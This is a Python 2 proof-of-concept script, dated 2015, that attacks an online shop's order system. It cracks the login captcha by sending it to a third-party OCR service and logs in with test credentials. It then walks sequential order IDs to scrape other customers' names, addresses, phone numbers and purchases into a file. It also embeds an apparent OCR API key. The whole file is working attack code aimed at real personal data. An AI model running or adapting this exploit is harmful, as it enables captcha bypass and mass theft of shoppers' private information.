#!/usr/bin/env python 
#check the yunpanshop poc
#joeyxy83@gmail.com
#20150618
#1.get the login.jsp,get the jsessionid
#2.get the checkcode jgep with jsessionid,then crack
#3.login.html
#4.get the order,get the order information.6534


import re
import time
import json
import urllib
import urllib2
import requests
import pytesseract
from PIL import Image
import httplib
from xml.etree import ElementTree
import sys
import time
import argparse
import codecs
import os 


__version__ = '0.1'
# version for Python OcrKing Client #

# OcrKing Api Url #
#get api url:http://api.ocrking.com/server.html
__api_url__ = 'http://112.226.129.217:6080/ok.html'


error = 0

class yunpanshop_crawler(object):

    def __init__(self,username,password,startorder,endorder,ocrkey):
        self.username = username
        self.password =password
        self.startorder = startorder
        self.endorder = endorder
        self.ocrkey = ocrkey
        self.headers = {'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:36.0) Gecko/20100101 Firefox/36.0',}
        self.cookie = ''
        self.checkCode = ''

    def yp_start(self):
        api_url = 'http://www.yunpanshop.com/login.jsp'
        try:
            req = requests.get(api_url,headers=self.headers,timeout=3)
            req_status = req.status_code
            cookie = req.cookies['JSESSIONID']
        except requests.RequestException as e:
            print "start login error:%s" % e
            sys.exit(1)
        if req_status == 200:
            if error:
                print "get cookie:%s" % cookie
            self.cookie=cookie
            self.yp_crack_captcha()

    def yp_crack_captcha(self):
        pic_file = self.downloadImg()
        file = str(pic_file)+'.png'
        path = './pic/'+file
        key = self.ocrkey
        image = open(path, "rb") 
        file = [('ocrfile',file,image.read())]

        fields = [('url','http://www.yunpanshop.com/checkCode.htm?id={0}'),('service', 'OcrKingForCaptcha'),('language','eng'),('charset','11'),('apiKey', key),('type','http://www.yunpanshop.com/checkCode.htm?id={0}')]

        xml = self.post_multipart(fields,file)
        self.read_xml(xml)

    def get_ocking_api_url():
        url = 'http://api.ocrking.com/server.html'
        global __api_url__
        try:
            results = requests.get(url,timeout=3)
            urls = results.text
            pattern = re.compile(r'\d+.\d+.\d+.\d+:\d+/ok.html')
            url=re.findall(pattern,urls)
            for i in range(len(url)):
                __api_url__="http://"+url[i]
                print __api_url__
        except requests.RequestException as e:
            print "cann't get ocking working api url.error:%s" % e
            sys.exit(1)

    def downloadImg(self):
        if os.path.exists('./pic/'):
            pass
        else:
            os.makedirs('./pic/')
        if error:
            print self.cookie
        cookies = {'JSESSIONID':self.cookie}
        headers = {'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:36.0) Gecko/20100101 Firefox/36.0',}
        pic_file = int(time.time())
        pic_url = "http://www.yunpanshop.com/checkCode.htm?id={0}"
        if error:
            print '[+] Download Picture: {}'.format(pic_url)
        try:
            resp = requests.get(pic_url, headers=headers,cookies = cookies,verify=False, timeout=5)
        except:
            resp = requests.get(pic_url, headers=headers,cookies = cookies,verify=False, timeout=3)
        with open("./pic/%s.png"%pic_file, 'wb') as fp:
            fp.write(resp.content)
        return pic_file



    def post_multipart(self,fields, files):
        content_type, body = self.encode_multipart(fields, files)
        httplib.HTTPConnection._http_vsn = 10  #must using the http 1.0
        httplib.HTTPConnection._http_vsn_str = 'HTTP/1.0'
        headers = {'Content-Type': content_type,
            'Content-Length': str(len(body)),
            'Accept-Encoding': 'gzip, deflate',
            'Referer': 'http://lab.ocrking.com/?pyclient' + __version__,
            'Accept':'*/*'}
        if error:
            print __api_url__
        r = urllib2.Request(__api_url__, body, headers)
        return urllib2.urlopen(r).read()

    ### format the data into multipart/form-data ###    
    def encode_multipart(self,fields, files):
        LIMIT = '----------OcrKing_Client_Aven_s_Lab_L$'
        CRLF = '\r\n'
        L = []
        for (key, value) in fields:
            L.append('--' + LIMIT)
            L.append('Content-Disposition: form-data; name="%s"' % key)
            L.append('')
            L.append(value)
        for (key, filename, value) in files:
            L.append('--' + LIMIT)
            L.append('Content-Disposition: form-data; name="%s"; filename="%s"' % (key, filename))
            L.append('Content-Type: application/octet-stream' )
            L.append('')
            L.append(value)
        L.append('--' + LIMIT + '--')
        L.append('')
        body = CRLF.join(L)
        content_type = 'multipart/form-data; boundary=%s' % LIMIT
        return content_type, body

    def print_node(self,node):
        global checkCode
        print "=====check captcha======"
        for key,value in node.items():
            print "%s:%s" % (key, value)
        for subnode in node.getchildren():
            if subnode.tag == 'Result':
                if error:
                    print "%s:%s" % (subnode.tag, subnode.text)
                if type(subnode.text) == str and len(subnode.text) == 4:
                    self.checkCode=subnode.text
                    if error:
                        print "checkCode is:%s" % checkCode
                    self.yp_login()
                else:
                    print "ocking check code error,try again"
                    time.sleep(1)
                    self.yp_crack_captcha()

    

    def read_xml(self,text = '', xmlfile = ''):
        root = ElementTree.fromstring(text)
        eitor = root.getiterator("Item")
        for e in eitor:
            self.print_node(e)

    def yp_login(self):
        print "=====start login======"
        api_url = 'http://www.yunpanshop.com/login.htm'
        cookies = {'JSESSIONID':self.cookie}
        data = {'pmid':'',
        'username':self.username,
        'password':self.password,
        'checkCode':self.checkCode,
        }
        try:
            req = requests.post(api_url, data=data, headers=self.headers,cookies = cookies,timeout=3)
            result = req.text
            if error:
                print result
            pattern = re.compile(r'main.htm')
            num = re.findall(pattern, result)
            if len(num) > 0:
                print "login ok,checkCode:%s" % self.checkCode
                self.yp_query_order()
            else:
                print "login fail,try again,checkCode:%s" % self.checkCode
                time.sleep(3)
                self.yp_crack_captcha()

        except requests.RequestException as e:
            print "request login fail %s" % e
            sys.exit(1)


    def yp_query_order(self):
        print "=====get order======"
        #api_url = 'http://www.yunpanshop.com/order/orderInfo.htm?orderCode=6634'
        cookies = {'JSESSIONID':self.cookie}
        file = time.strftime("%y-%m-%d-%H-%M.") + 'result.list'
        f = codecs.open(file,'w+','utf-8')
        for i in range(self.startorder,self.endorder,1):
            time.sleep(0.1)
            api_url = 'http://www.yunpanshop.com/order/orderInfo.htm?orderCode=%s' % i 
            try:
                results = requests.get(api_url,headers=self.headers,cookies = cookies,verify=False, timeout=5)  
                if error:
                    print results.text
                errors = re.compile(r'This is error page.')
                if re.findall(errors,results.text):
                    pass
                else:
                    pattern = re.compile('<table.*?width="90%">(.*?)</td>.*?<td>.*?</td>.*?<td>(.*?)</td>.*?<td>.*?<td>(.*?)</td>.*?</table>',re.S)
                    items = re.findall(pattern,results.text)
                    print "item:%s:username:%s,address:%s,tel:%s" % (int(i-1000),items[0][0],items[0][1],items[0][2])
                    pattern2 = re.compile('<table.*?goods-order-list m-b15">.*?</tr>.*?<tr>.*?"center">(\d+)</td>.*?,">(.*?)</a></td>.*?"center">(.*?)</td>.*?"center">(.*?)</td>.*?</table>',re.S)
                    orderitems = re.findall(pattern2, results.text)
                    try:
                        out = "item:"+str(int(i-1000))+",username:"+items[0][0]+",address:"+items[0][1]+",tel:"+items[0][2]+",orderno:"+orderitems[0][0]+",info:"+orderitems[0][1]+",kg:"+orderitems[0][2]+",price:"+orderitems[0][3]
                        f.write(out+'\n')
                    except:
                        pass
            except requests.RequestException as e:
                print "request login fail %s" % e
                sys.exit(1) 
        f.close()



if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='poc of get yunpanshop order information')
    parser.add_argument('--username',action="store",dest="username",default='jtest')
    parser.add_argument('--password',action="store",dest="password",default='jtest12')
    parser.add_argument('--startorder',action='store',dest="startorder",type=int,default=1001)
    parser.add_argument('--endorder',action='store',dest="endorder",type=int,default=1005)
    parser.add_argument('--ocrkey',action='store',dest="ocrkey",default='def1e763f8ebc690cbubfgyKfTjB0MI1egCtrNt4hJNBlxyCRy1bptAc65x1VhI0dCcwTL')
    given_args= parser.parse_args()
    username = given_args.username
    password = given_args.password
    startorder = given_args.startorder
    endorder = given_args.endorder
    ocrkey = given_args.ocrkey

    crawler = yunpanshop_crawler(username=username,password=password,startorder=startorder,endorder=endorder,ocrkey=ocrkey)
    crawler.yp_start()


